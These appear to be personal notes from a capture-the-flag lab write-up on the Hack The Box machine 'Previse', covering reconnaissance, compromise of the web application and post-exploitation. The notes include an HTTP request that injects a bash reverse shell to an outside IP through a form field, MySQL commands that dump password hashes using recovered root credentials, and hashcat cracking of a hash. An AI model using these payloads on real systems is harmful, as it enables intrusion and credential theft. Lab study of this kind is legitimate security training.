# PREVISE

## Nmap

```{sh}
nmap -sC -sV -p22,80 10.129.95.185
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-14 21:40 CET
Nmap scan report for 10.129.95.185
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.12 seconds
```

host is running both an ssh server and an apache server. Let's first find vulns in the apache server

# WEB-APP

information we can get before the actual assesment

the site was created by m4lwhere

One strange thing is that when asking for resources we should have not access to, such accoutns, we are acctually given 
the html web page. taking in account that this is a php based web, it means that it executes before redirection, meaning that 
we can just do whatever we want anyway.

mysql is actually up and running (even though it was not in the nmap)
## users 

admin: newguy
z
## Post explotation

Now we have access to the code of all the files in the web server:

discoveries:
we can upload files to the server with no restrictions 
many times the web-page accesses a mysql database 
user-passwords are hashed in the database
The database previse has credentials root:mySQL_p@ssw0rd!:)

POST /logs.php HTTP/1.1
Host: 10.129.95.185
Content-Length: 68
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.95.185
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.185/file_logs.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=nhk0tigq378kme260i2vpisvmv
Connection: close

delim=%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.101/2020+0>%261'%3b

# Inside the machine 

home:

nothing here except the user flag (unreachable for now) and that the user m4lwhere likes to use vim

/var/www:

there exists files with id 1-6 and 24 25


ideas: there was a database storing user information (although passworld are hashed)

```{sh}
mysql -u root -p'mySQL_p@ssw0rd!:)' -e 'SHOW DATABASES;'

Database
information_schema
mysql
performance_schema
previse
sys

mysql -u root -p'mySQL_p@ssw0rd!:)' -e 'SHOW TABLES;' previse

Tables_in_previse
accounts
files

mysql -u root -p'mySQL_p@ssw0rd!:)' -e 'SELECT * FROM accounts;' previse

id	username	password	created_at
1	m4lwhere	$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.	2021-05-27 18:18:36
2	oriol	$1$🧂llol$vLuN7GB6eroB7YOErHW42.	2023-02-19 15:31:44

```

shell.php



hashcat -m 500 -a 0 '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.'  ../SecLists/Passwords/Leaked-Databases/rockyou.txt

remember salts go hash:salt independently of the mode 

 hashcat -m 500 -a 0 '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.'  ../SecLists/Passwords/Leaked-Databases/rockyou.txt --show
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
